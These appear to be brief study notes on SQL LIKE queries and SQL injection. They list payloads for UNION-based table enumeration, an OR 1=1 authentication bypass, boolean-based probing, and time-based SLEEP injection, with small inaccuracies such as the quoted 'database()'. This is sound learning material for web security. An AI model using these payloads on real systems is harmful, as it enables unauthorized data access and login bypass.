### SQL 
```
select * from users where username like 'a%';
```
Result: admin

```
select * from users where username like '%n';
```
Result: admin, jon, martin

```
select * from users where username like '%mi%';
```
Result:admin

### Error Based

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database()'
```

#### Authentication Bypass
```
select * from users where username='' and password='' OR 1=1;
```

#### Boolean Based
```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

#### Time Based
```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```